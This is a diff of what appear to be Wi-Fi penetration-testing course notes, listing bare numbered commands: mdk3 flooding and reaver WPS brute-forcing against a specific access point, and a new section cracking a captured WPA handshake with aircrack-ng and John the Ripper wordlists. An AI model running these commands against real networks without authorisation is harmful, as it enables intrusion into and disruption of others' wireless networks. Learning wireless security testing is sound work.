@@ -167,3 +167,17 @@ v-32)
 13) mdk3 -i mon0 a -a 54:67:51:C8:D4:10 -m 
 
 14) reaver -b 54:67:51:C8:D4:10 -c 6 -i mon0 
+
+
+Section - 6
+
+v-1)
+
+1) aircrack-ng handshake-01.cap -w wpa-wordlist 
+
+2) john --wordlist=wpa-wordlist --stdout
+
+3) john --wordlist=wpa-wordlist --stdout --session=upc | aircrack-ng -w - -b 00:10:18:90:2D:EE handshake-01.cap
+
+4) john --restore=upc | aircrack-ng -w - -b 00:10:18:90:2D:EE handshake-01.cap
+
